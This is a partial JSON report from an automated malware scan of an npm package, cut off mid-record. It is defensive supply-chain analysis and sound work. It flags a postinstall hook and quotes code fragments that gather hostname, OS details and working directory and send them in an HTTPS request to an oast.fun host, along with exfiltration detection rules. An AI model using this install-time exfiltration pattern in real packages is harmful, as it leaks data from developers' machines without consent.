@@ -1,0 +1,3195 @@
+{
+  "sampleId": "DD-NPM-002",
+  "subject": {
+    "sampleId": "DD-NPM-002",
+    "ecosystem": "npm",
+    "packageName": "@add-wallet-exchange/import-type",
+    "packageVersion": "1.0.0"
+  },
+  "artifactSha256": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65",
+  "analysisSource": "NEW_STATIC_ANALYSIS",
+  "existingResultReused": false,
+  "status": "COMPLETED",
+  "versions": {
+    "node": "v26.4.0",
+    "requiredNode": ">=24.0.0 <25",
+    "platform": "darwin/arm64",
+    "scannerCommit": "e766f2e2724e119e9989b7e382b74b98a9ddbe3e",
+    "scannerBranch": "feat/435--agent-planning-filter1",
+    "dockerImageDigest": "sha256:6c9b0e051011000600036ecacd0209081f58754eec65b13255d87cf2881e9640",
+    "guarddogTool": "3.1.0",
+    "semgrepTool": "1.172.0",
+    "rulesetSha256": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1",
+    "filterRuleVersion": "0.1.0",
+    "planningSchemaVersion": "0.1.0"
+  },
+  "analyzerSummary": [
+    {
+      "analyzer": "metadata",
+      "analyzerVersion": "0.1.0",
+      "status": "SUCCESS",
+      "errors": [],
+      "execution": {
+        "startedAt": "2026-10-01T09:26:31.873Z",
+        "completedAt": "2026-10-01T09:26:31.873Z",
+        "durationMs": 0
+      },
+      "findingCount": 1
+    },
+    {
+      "analyzer": "custom-rule",
+      "analyzerVersion": "0.2.0",
+      "status": "SUCCESS",
+      "errors": [],
+      "execution": {
+        "startedAt": "2026-10-01T09:26:31.873Z",
+        "completedAt": "2026-10-01T09:26:33.115Z",
+        "durationMs": 1242
+      },
+      "findingCount": 9
+    },
+    {
+      "analyzer": "guarddog",
+      "analyzerVersion": "0.1.0",
+      "status": "SUCCESS",
+      "errors": [],
+      "execution": {
+        "startedAt": "2026-10-01T09:26:33.115Z",
+        "completedAt": "2026-10-01T09:26:33.534Z",
+        "durationMs": 419
+      },
+      "findingCount": 11
+    },
+    {
+      "analyzer": "obfuscation",
+      "analyzerVersion": "0.2.0",
+      "status": "SUCCESS",
+      "errors": [],
+      "execution": {
+        "startedAt": "2026-10-01T09:26:33.534Z",
+        "completedAt": "2026-10-01T09:26:33.537Z",
+        "durationMs": 3
+      },
+      "findingCount": 0
+    }
+  ],
+  "planningInput": {
+    "schemaVersion": "0.1.0",
+    "subject": {
+      "requestId": "pilot-DD-NPM-002",
+      "scanId": "pilot-DD-NPM-002",
+      "ecosystem": "npm",
+      "packageName": "@add-wallet-exchange/import-type",
+      "packageVersion": "1.0.0",
+      "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+    },
+    "tier1": {
+      "analyzers": [
+        {
+          "analyzer": "metadata",
+          "analyzerVersion": "0.1.0",
+          "status": "SUCCESS",
+          "findings": [
+            {
+              "findingId": "metadata:metadata.lifecycle.postinstall:0",
+              "ruleId": "metadata.lifecycle.postinstall",
+              "type": "LIFECYCLE_SCRIPT",
+              "message": "Lifecycle script \"postinstall\" is present in package.json",
+              "location": {
+                "type": "METADATA",
+                "jsonPointer": "/scripts/postinstall"
+              },
+              "data": {
+                "scriptName": "postinstall",
+                "scriptValue": "node index.js",
+                "observation": "PRESENT"
+              }
+            }
+          ],
+          "errors": [],
+          "execution": {
+            "startedAt": "2026-10-01T09:26:31.873Z",
+            "completedAt": "2026-10-01T09:26:31.873Z",
+            "durationMs": 0
+          }
+        },
+        {
+          "analyzer": "custom-rule",
+          "analyzerVersion": "0.2.0",
+          "status": "SUCCESS",
+          "findings": [
+            {
+              "findingId": "custom-rule:custom.collection-source:0",
+              "ruleId": "custom.collection-source",
+              "type": "CAPABILITY_PATTERN",
+              "message": "Collection source access observed.",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 10
+              },
+              "data": {
+                "interpretation": "STATIC_PATTERN",
+                "signalRuleIds": [
+                  "custom.collection-source"
+                ],
+                "doesNotProve": "Static evidence does not prove runtime execution or external reception.",
+                "actionHint": "COLLECTION_SOURCE",
+                "sourceType": "SYSTEM_INFORMATION",
+                "executionContext": "RUNTIME",
+                "evidenceKind": "STATIC_PATTERN",
+                "analysisLevel": "PATTERN",
+                "limitations": [
+                  "Limited lexical flow and direct local-module analysis only."
+                ],
+                "reviewStatus": "PENDING",
+                "confidence": "MEDIUM",
+                "locations": [
+                  {
+                    "type": "SOURCE_FILE",
+                    "path": "index.js",
+                    "startLine": 10
+                  }
+                ],
+                "provenance": {
+                  "source": "CUSTOM_STATIC_RULE",
+                  "analyzer": "custom-rule",
+                  "analyzerVersion": "0.2.0",
+                  "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+                },
+                "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+              }
+            },
+            {
+              "findingId": "custom-rule:custom.collection-source:1",
+              "ruleId": "custom.collection-source",
+              "type": "CAPABILITY_PATTERN",
+              "message": "Collection source access observed.",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 6
+              },
+              "data": {
+                "interpretation": "STATIC_PATTERN",
+                "signalRuleIds": [
+                  "custom.collection-source"
+                ],
+                "doesNotProve": "Static evidence does not prove runtime execution or external reception.",
+                "actionHint": "COLLECTION_SOURCE",
+                "sourceType": "SYSTEM_INFORMATION",
+                "executionContext": "RUNTIME",
+                "evidenceKind": "STATIC_PATTERN",
+                "analysisLevel": "PATTERN",
+                "limitations": [
+                  "Limited lexical flow and direct local-module analysis only."
+                ],
+                "reviewStatus": "PENDING",
+                "confidence": "MEDIUM",
+                "locations": [
+                  {
+                    "type": "SOURCE_FILE",
+                    "path": "index.js",
+                    "startLine": 6
+                  }
+                ],
+                "provenance": {
+                  "source": "CUSTOM_STATIC_RULE",
+                  "analyzer": "custom-rule",
+                  "analyzerVersion": "0.2.0",
+                  "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+                },
+                "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+              }
+            },
+            {
+              "findingId": "custom-rule:custom.collection-source:2",
+              "ruleId": "custom.collection-source",
+              "type": "CAPABILITY_PATTERN",
+              "message": "Collection source access observed.",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 7
+              },
+              "data": {
+                "interpretation": "STATIC_PATTERN",
+                "signalRuleIds": [
+                  "custom.collection-source"
+                ],
+                "doesNotProve": "Static evidence does not prove runtime execution or external reception.",
+                "actionHint": "COLLECTION_SOURCE",
+                "sourceType": "SYSTEM_INFORMATION",
+                "executionContext": "RUNTIME",
+                "evidenceKind": "STATIC_PATTERN",
+                "analysisLevel": "PATTERN",
+                "limitations": [
+                  "Limited lexical flow and direct local-module analysis only."
+                ],
+                "reviewStatus": "PENDING",
+                "confidence": "MEDIUM",
+                "locations": [
+                  {
+                    "type": "SOURCE_FILE",
+                    "path": "index.js",
+                    "startLine": 7
+                  }
+                ],
+                "provenance": {
+                  "source": "CUSTOM_STATIC_RULE",
+                  "analyzer": "custom-rule",
+                  "analyzerVersion": "0.2.0",
+                  "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+                },
+                "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+              }
+            },
+            {
+              "findingId": "custom-rule:custom.collection-source:3",
+              "ruleId": "custom.collection-source",
+              "type": "CAPABILITY_PATTERN",
+              "message": "Collection source access observed.",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 8
+              },
+              "data": {
+                "interpretation": "STATIC_PATTERN",
+                "signalRuleIds": [
+                  "custom.collection-source"
+                ],
+                "doesNotProve": "Static evidence does not prove runtime execution or external reception.",
+                "actionHint": "COLLECTION_SOURCE",
+                "sourceType": "SYSTEM_INFORMATION",
+                "executionContext": "RUNTIME",
+                "evidenceKind": "STATIC_PATTERN",
+                "analysisLevel": "PATTERN",
+                "limitations": [
+                  "Limited lexical flow and direct local-module analysis only."
+                ],
+                "reviewStatus": "PENDING",
+                "confidence": "MEDIUM",
+                "locations": [
+                  {
+                    "type": "SOURCE_FILE",
+                    "path": "index.js",
+                    "startLine": 8
+                  }
+                ],
+                "provenance": {
+                  "source": "CUSTOM_STATIC_RULE",
+                  "analyzer": "custom-rule",
+                  "analyzerVersion": "0.2.0",
+                  "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+                },
+                "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+              }
+            },
+            {
+              "findingId": "custom-rule:custom.lifecycle-entry:4",
+              "ruleId": "custom.lifecycle-entry",
+              "type": "CAPABILITY_PATTERN",
+              "message": "postinstall lifecycle script references a local source entry.",
+              "location": {
+                "type": "METADATA",
+                "jsonPointer": "/scripts/postinstall"
+              },
+              "data": {
+                "interpretation": "STATIC_PATTERN",
+                "signalRuleIds": [
+                  "custom.lifecycle-entry"
+                ],
+                "doesNotProve": "Lifecycle declaration does not prove runtime execution.",
+                "actionHint": "LIFECYCLE_ENTRY",
+                "executionContext": "POSTINSTALL",
+                "evidenceKind": "STATIC_PATTERN",
+                "analysisLevel": "PATTERN",
+                "limitations": [
+                  "Only explicit local JavaScript or TypeScript entry paths are followed."
+                ],
+                "reviewStatus": "PENDING",
+                "confidence": "MEDIUM",
+                "locations": [
+                  {
+                    "type": "METADATA",
+                    "jsonPointer": "/scripts/postinstall"
+                  }
+                ],
+                "provenance": {
+                  "source": "CUSTOM_STATIC_RULE",
+                  "analyzer": "custom-rule",
+                  "analyzerVersion": "0.2.0",
+                  "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+                },
+                "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+              }
+            },
+            {
+              "findingId": "custom-rule:custom.network-outbound:5",
+              "ruleId": "custom.network-outbound",
+              "type": "CAPABILITY_PATTERN",
+              "message": "Network egress API observed.",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 18
+              },
+              "data": {
+                "interpretation": "STATIC_PATTERN",
+                "signalRuleIds": [
+                  "custom.network-outbound"
+                ],
+                "doesNotProve": "Static evidence does not prove runtime execution or external reception.",
+                "actionHint": "NETWORK_REQUEST",
+                "sinkType": "network-call",
+                "executionContext": "RUNTIME",
+                "evidenceKind": "STATIC_PATTERN",
+                "analysisLevel": "PATTERN",
+                "limitations": [
+                  "Limited lexical flow and direct local-module analysis only."
+                ],
+                "reviewStatus": "PENDING",
+                "confidence": "MEDIUM",
+                "locations": [
+                  {
+                    "type": "SOURCE_FILE",
+                    "path": "index.js",
+                    "startLine": 18
+                  }
+                ],
+                "provenance": {
+                  "source": "CUSTOM_STATIC_RULE",
+                  "analyzer": "custom-rule",
+                  "analyzerVersion": "0.2.0",
+                  "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+                },
+                "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+              }
+            },
+            {
+              "findingId": "custom-rule:custom.network-outbound:6",
+              "ruleId": "custom.network-outbound",
+              "type": "CAPABILITY_PATTERN",
+              "message": "Network egress API observed.",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 37
+              },
+              "data": {
+                "interpretation": "STATIC_PATTERN",
+                "signalRuleIds": [
+                  "custom.network-outbound"
+                ],
+                "doesNotProve": "Static evidence does not prove runtime execution or external reception.",
+                "actionHint": "NETWORK_REQUEST",
+                "sinkType": "network-call",
+                "executionContext": "RUNTIME",
+                "evidenceKind": "STATIC_PATTERN",
+                "analysisLevel": "PATTERN",
+                "limitations": [
+                  "Limited lexical flow and direct local-module analysis only."
+                ],
+                "reviewStatus": "PENDING",
+                "confidence": "MEDIUM",
+                "locations": [
+                  {
+                    "type": "SOURCE_FILE",
+                    "path": "index.js",
+                    "startLine": 37
+                  }
+                ],
+                "provenance": {
+                  "source": "CUSTOM_STATIC_RULE",
+                  "analyzer": "custom-rule",
+                  "analyzerVersion": "0.2.0",
+                  "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+                },
+                "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+              }
+            },
+            {
+              "findingId": "custom-rule:custom.remote-download:7",
+              "ruleId": "custom.remote-download",
+              "type": "CAPABILITY_PATTERN",
+              "message": "Remote response or download candidate observed.",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 18
+              },
+              "data": {
+                "interpretation": "STATIC_PATTERN",
+                "signalRuleIds": [
+                  "custom.remote-download"
+                ],
+                "doesNotProve": "Static evidence does not prove runtime execution or external reception.",
+                "actionHint": "REMOTE_DOWNLOAD",
+                "sourceType": "REMOTE_RESPONSE",
+                "executionContext": "RUNTIME",
+                "evidenceKind": "STATIC_PATTERN",
+                "analysisLevel": "PATTERN",
+                "limitations": [
+                  "Limited lexical flow and direct local-module analysis only."
+                ],
+                "reviewStatus": "PENDING",
+                "confidence": "MEDIUM",
+                "locations": [
+                  {
+                    "type": "SOURCE_FILE",
+                    "path": "index.js",
+                    "startLine": 18
+                  }
+                ],
+                "provenance": {
+                  "source": "CUSTOM_STATIC_RULE",
+                  "analyzer": "custom-rule",
+                  "analyzerVersion": "0.2.0",
+                  "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+                },
+                "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+              }
+            },
+            {
+              "findingId": "custom-rule:custom.remote-download:8",
+              "ruleId": "custom.remote-download",
+              "type": "CAPABILITY_PATTERN",
+              "message": "Remote response or download candidate observed.",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 37
+              },
+              "data": {
+                "interpretation": "STATIC_PATTERN",
+                "signalRuleIds": [
+                  "custom.remote-download"
+                ],
+                "doesNotProve": "Static evidence does not prove runtime execution or external reception.",
+                "actionHint": "REMOTE_DOWNLOAD",
+                "sourceType": "REMOTE_RESPONSE",
+                "executionContext": "RUNTIME",
+                "evidenceKind": "STATIC_PATTERN",
+                "analysisLevel": "PATTERN",
+                "limitations": [
+                  "Limited lexical flow and direct local-module analysis only."
+                ],
+                "reviewStatus": "PENDING",
+                "confidence": "MEDIUM",
+                "locations": [
+                  {
+                    "type": "SOURCE_FILE",
+                    "path": "index.js",
+                    "startLine": 37
+                  }
+                ],
+                "provenance": {
+                  "source": "CUSTOM_STATIC_RULE",
+                  "analyzer": "custom-rule",
+                  "analyzerVersion": "0.2.0",
+                  "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+                },
+                "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+              }
+            }
+          ],
+          "errors": [],
+          "execution": {
+            "startedAt": "2026-10-01T09:26:31.873Z",
+            "completedAt": "2026-10-01T09:26:33.115Z",
+            "durationMs": 1242
+          },
+          "customRule": {
+            "relationCandidates": [
+              {
+                "relationId": "custom-relation:84e664cc3dd75ac1",
+                "relationType": "COLLECTION_TO_NETWORK",
+                "sourceFindingIds": [
+                  "custom-rule:custom.collection-source:0",
+                  "custom-rule:custom.collection-source:1",
+                  "custom-rule:custom.collection-source:2",
+                  "custom-rule:custom.collection-source:3"
+                ],
+                "sinkFindingIds": [
+                  "custom-rule:custom.network-outbound:5"
+                ],
+                "evidenceKind": "STATIC_DATA_FLOW",
+                "analysisLevel": "DATA_FLOW",
+                "executionContext": "RUNTIME",
+                "status": "CANDIDATE",
+                "provenance": {
+                  "source": "CUSTOM_STATIC_RULE",
+                  "analyzer": "custom-rule",
+                  "analyzerVersion": "0.2.0",
+                  "ruleVersion": "969bb8f9a053a2ec6c1bbb46805cfe0deadbf1aeccc68a129de35a4b9c6138f1"
+                },
+                "locations": {
+                  "sources": [
+                    {
+                      "type": "SOURCE_FILE",
+                      "path": "index.js",
+                      "startLine": 10
+                    },
+                    {
+                      "type": "SOURCE_FILE",
+                      "path": "index.js",
+                      "startLine": 6
+                    },
+                    {
+                      "type": "SOURCE_FILE",
+                      "path": "index.js",
+                      "startLine": 7
+                    },
+                    {
+                      "type": "SOURCE_FILE",
+                      "path": "index.js",
+                      "startLine": 8
+                    }
+                  ],
+                  "sinks": [
+                    {
+                      "type": "SOURCE_FILE",
+                      "path": "index.js",
+                      "startLine": 18
+                    }
+                  ]
+                },
+                "limitations": [
+                  "Static identifier flow does not prove that a remote server received or processed the value.",
+                  "Flow through dynamic properties, closures, or external modules may not be represented."
+                ]
+              }
+            ]
+          }
+        },
+        {
+          "analyzer": "guarddog",
+          "analyzerVersion": "0.1.0",
+          "status": "SUCCESS",
+          "findings": [
+            {
+              "findingId": "guarddog:capability-network-download:0",
+              "ruleId": "capability-network-download",
+              "type": "CAPABILITY",
+              "message": "Detects downloading files from network",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 18
+              },
+              "data": {
+                "guarddog": {
+                  "resultRuleId": "capability-network-download",
+                  "rawResult": {
+                    "location": "index.js:18",
+                    "code": "    https.get(url1, (res) => {\n        let data = '';",
+                    "match": "https.get(",
+                    "message": "Detects downloading files from network"
+                  }
+                },
+                "code": "    https.get(url1, (res) => {\n        let data = '';",
+                "match": "https.get("
+              }
+            },
+            {
+              "findingId": "guarddog:capability-network-outbound:0",
+              "ruleId": "capability-network-outbound",
+              "type": "CAPABILITY",
+              "message": "Detects network request capabilities (HTTP, sockets, etc.)",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 3
+              },
+              "data": {
+                "guarddog": {
+                  "resultRuleId": "capability-network-outbound",
+                  "rawResult": {
+                    "location": "index.js:3",
+                    "code": "const process = require('process');\nconst https = require('https');\nconst http = require('http');",
+                    "match": "require('https')",
+                    "message": "Detects network request capabilities (HTTP, sockets, etc.)"
+                  }
+                },
+                "code": "const process = require('process');\nconst https = require('https');\nconst http = require('http');",
+                "match": "require('https')"
+              }
+            },
+            {
+              "findingId": "guarddog:threat-network-exfil-sysinfo:0",
+              "ruleId": "threat-network-exfil-sysinfo",
+              "type": "THREAT_INDICATOR",
+              "message": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 8
+              },
+              "data": {
+                "guarddog": {
+                  "resultRuleId": "threat-network-exfil-sysinfo",
+                  "rawResult": {
+                    "location": "index.js:8",
+                    "code": "const release = os.release();\nconst hostname = os.hostname();\n\nconst cwd = process.cwd();",
+                    "match": "os.hostname()",
+                    "message": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)"
+                  }
+                },
+                "code": "const release = os.release();\nconst hostname = os.hostname();\n\nconst cwd = process.cwd();",
+                "match": "os.hostname()"
+              }
+            },
+            {
+              "findingId": "guarddog:threat-network-exfil-sysinfo:1",
+              "ruleId": "threat-network-exfil-sysinfo",
+              "type": "THREAT_INDICATOR",
+              "message": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 18
+              },
+              "data": {
+                "guarddog": {
+                  "resultRuleId": "threat-network-exfil-sysinfo",
+                  "rawResult": {
+                    "location": "index.js:18",
+                    "code": "    https.get(url1, (res) => {\n        let data = '';",
+                    "match": "https.get(",
+                    "message": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)"
+                  }
+                },
+                "code": "    https.get(url1, (res) => {\n        let data = '';",
+                "match": "https.get("
+              }
+            },
+            {
+              "findingId": "guarddog:threat-network-exfil-sysinfo:2",
+              "ruleId": "threat-network-exfil-sysinfo",
+              "type": "THREAT_INDICATOR",
+              "message": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 37
+              },
+              "data": {
+                "guarddog": {
+                  "resultRuleId": "threat-network-exfil-sysinfo",
+                  "rawResult": {
+                    "location": "index.js:37",
+                    "code": "    http.get(url2, (res) => {\n        const status = res.statusCode;\n        console.log('Status Code from second request:', status);",
+                    "match": "http.get(",
+                    "message": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)"
+                  }
+                },
+                "code": "    http.get(url2, (res) => {\n        const status = res.statusCode;\n        console.log('Status Code from second request:', status);",
+                "match": "http.get("
+              }
+            },
+            {
+              "findingId": "guarddog:threat-network-outbound-shady-links:0",
+              "ruleId": "threat-network-outbound-shady-links",
+              "type": "THREAT_INDICATOR",
+              "message": "Detects URLs to URL shorteners, file sharing, and suspicious services",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 15
+              },
+              "data": {
+                "guarddog": {
+                  "resultRuleId": "threat-network-outbound-shady-links",
+                  "rawResult": {
+                    "location": "index.js:15",
+                    "code": "function makeFirstRequest(status) {\n    const url1 = `https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun/?1=${encodeURIComponent(osname_str)}&2=${encodeURIComponent(cwd)}&3=${encodeURIComponent(hostname)}...",
+                    "match": "https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun",
+                    "message": "Detects URLs to URL shorteners, file sharing, and suspicious services"
+                  }
+                },
+                "code": "function makeFirstRequest(status) {\n    const url1 = `https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun/?1=${encodeURIComponent(osname_str)}&2=${encodeURIComponent(cwd)}&3=${encodeURIComponent(hostname)}...",
+                "match": "https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun"
+              }
+            },
+            {
+              "findingId": "guarddog:threat-network-outbound-shady-links:1",
+              "ruleId": "threat-network-outbound-shady-links",
+              "type": "THREAT_INDICATOR",
+              "message": "Detects URLs to URL shorteners, file sharing, and suspicious services",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 15
+              },
+              "data": {
+                "guarddog": {
+                  "resultRuleId": "threat-network-outbound-shady-links",
+                  "rawResult": {
+                    "location": "index.js:15",
+                    "code": "function makeFirstRequest(status) {\n    const url1 = `https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun/?1=${encodeURIComponent(osname_str)}&2=${encodeURIComponent(cwd)}&3=${encodeURIComponent(hostname)}`\n  ...",
+                    "match": "fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun",
+                    "message": "Detects URLs to URL shorteners, file sharing, and suspicious services"
+                  }
+                },
+                "code": "function makeFirstRequest(status) {\n    const url1 = `https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun/?1=${encodeURIComponent(osname_str)}&2=${encodeURIComponent(cwd)}&3=${encodeURIComponent(hostname)}`\n  ...",
+                "match": "fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun"
+              }
+            },
+            {
+              "findingId": "guarddog:threat-network-outbound-shady-links:2",
+              "ruleId": "threat-network-outbound-shady-links",
+              "type": "THREAT_INDICATOR",
+              "message": "Detects URLs to URL shorteners, file sharing, and suspicious services",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 15
+              },
+              "data": {
+                "guarddog": {
+                  "resultRuleId": "threat-network-outbound-shady-links",
+                  "rawResult": {
+                    "location": "index.js:15",
+                    "code": "function makeFirstRequest(status) {\n    const url1 = `https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun/?1=${encodeURIComponent(osname_str)}&2=${encodeURIComponent(cwd)}&3=${encodeURIComponent(hostname)}`\n                 +...",
+                    "match": ".oast.fun",
+                    "message": "Detects URLs to URL shorteners, file sharing, and suspicious services"
+                  }
+                },
+                "code": "function makeFirstRequest(status) {\n    const url1 = `https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun/?1=${encodeURIComponent(osname_str)}&2=${encodeURIComponent(cwd)}&3=${encodeURIComponent(hostname)}`\n                 +...",
+                "match": ".oast.fun"
+              }
+            },
+            {
+              "findingId": "guarddog:threat-network-outbound-shady-links:3",
+              "ruleId": "threat-network-outbound-shady-links",
+              "type": "THREAT_INDICATOR",
+              "message": "Detects URLs to URL shorteners, file sharing, and suspicious services",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 15
+              },
+              "data": {
+                "guarddog": {
+                  "resultRuleId": "threat-network-outbound-shady-links",
+                  "rawResult": {
+                    "location": "index.js:15",
+                    "code": "function makeFirstRequest(status) {\n    const url1 = `https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun/?1=${encodeURIComponent(osname_str)}&2=${encodeURIComponent(cwd)}&3=${encodeURIComponent(hostname)}`\n                 + ...",
+                    "match": "oast.fun",
+                    "message": "Detects URLs to URL shorteners, file sharing, and suspicious services"
+                  }
+                },
+                "code": "function makeFirstRequest(status) {\n    const url1 = `https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun/?1=${encodeURIComponent(osname_str)}&2=${encodeURIComponent(cwd)}&3=${encodeURIComponent(hostname)}`\n                 + ...",
+                "match": "oast.fun"
+              }
+            },
+            {
+              "findingId": "guarddog:threat-runtime-system-info:0",
+              "ruleId": "threat-runtime-system-info",
+              "type": "THREAT_INDICATOR",
+              "message": "Detects active collection of system information (hostname, platform, architecture, user)",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 8
+              },
+              "data": {
+                "guarddog": {
+                  "resultRuleId": "threat-runtime-system-info",
+                  "rawResult": {
+                    "location": "index.js:8",
+                    "code": "const release = os.release();\nconst hostname = os.hostname();\n\nconst cwd = process.cwd();",
+                    "match": "os.hostname()",
+                    "message": "Detects active collection of system information (hostname, platform, architecture, user)"
+                  }
+                },
+                "code": "const release = os.release();\nconst hostname = os.hostname();\n\nconst cwd = process.cwd();",
+                "match": "os.hostname()"
+              }
+            },
+            {
+              "findingId": "guarddog:threat-runtime-system-info:1",
+              "ruleId": "threat-runtime-system-info",
+              "type": "THREAT_INDICATOR",
+              "message": "Detects active collection of system information (hostname, platform, architecture, user)",
+              "location": {
+                "type": "SOURCE_FILE",
+                "path": "index.js",
+                "startLine": 6
+              },
+              "data": {
+                "guarddog": {
+                  "resultRuleId": "threat-runtime-system-info",
+                  "rawResult": {
+                    "location": "index.js:6",
+                    "code": "const osname = os.type();\nconst release = os.release();\nconst hostname = os.hostname();",
+                    "match": "os.type()",
+                    "message": "Detects active collection of system information (hostname, platform, architecture, user)"
+                  }
+                },
+                "code": "const osname = os.type();\nconst release = os.release();\nconst hostname = os.hostname();",
+                "match": "os.type()"
+              }
+            }
+          ],
+          "errors": [],
+          "execution": {
+            "startedAt": "2026-10-01T09:26:33.115Z",
+            "completedAt": "2026-10-01T09:26:33.534Z",
+            "durationMs": 419
+          },
+          "guarddog": {
+            "risks": [
+              {
+                "name": "risk.network.outbound",
+                "category": "network",
+                "severity": "high",
+                "mitre_tactics": [
+                  "exfiltration"
+                ],
+                "threat_identifies": "threat.network.outbound",
+                "threat_rule": "threat-network-exfil-sysinfo",
+                "threat_description": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)",
+                "threat_location": "index.js:8",
+                "threat_code": "const release = os.release();\nconst hostname = os.hostname();\n\nconst cwd = process.cwd();",
+                "threat_match": "os.hostname()",
+                "capability_identifies": null,
+                "capability_rule": null,
+                "file_path": "index.js"
+              },
+              {
+                "name": "risk.network.outbound",
+                "category": "network",
+                "severity": "high",
+                "mitre_tactics": [
+                  "exfiltration"
+                ],
+                "threat_identifies": "threat.network.outbound",
+                "threat_rule": "threat-network-exfil-sysinfo",
+                "threat_description": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)",
+                "threat_location": "index.js:18",
+                "threat_code": "    https.get(url1, (res) => {\n        let data = '';",
+                "threat_match": "https.get(",
+                "capability_identifies": null,
+                "capability_rule": null,
+                "file_path": "index.js"
+              },
+              {
+                "name": "risk.network.outbound",
+                "category": "network",
+                "severity": "high",
+                "mitre_tactics": [
+                  "exfiltration"
+                ],
+                "threat_identifies": "threat.network.outbound",
+                "threat_rule": "threat-network-exfil-sysinfo",
+                "threat_description": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)",
+                "threat_location": "index.js:37",
+                "threat_code": "    http.get(url2, (res) => {\n        const status = res.statusCode;\n        console.log('Status Code from second request:', status);",
+                "threat_match": "http.get(",
+                "capability_identifies": null,
+                "capability_rule": null,
+                "file_path": "index.js"
+              },
+              {
+                "name": "risk.runtime.system",
+                "category": "runtime",
+                "severity": "low",
+                "mitre_tactics": [
+                  "collection"
+                ],
+                "threat_identifies": "threat.runtime.system.info",
+                "threat_rule": "threat-runtime-system-info",
+                "threat_description": "Detects active collection of system information (hostname, platform, architecture, user)",
+                "threat_location": "index.js:8",
+                "threat_code": "const release = os.release();\nconst hostname = os.hostname();\n\nconst cwd = process.cwd();",
+                "threat_match": "os.hostname()",
+                "capability_identifies": null,
+                "capability_rule": null,
+                "file_path": "index.js"
+              },
+              {
+                "name": "risk.runtime.system",
+                "category": "runtime",
+                "severity": "low",
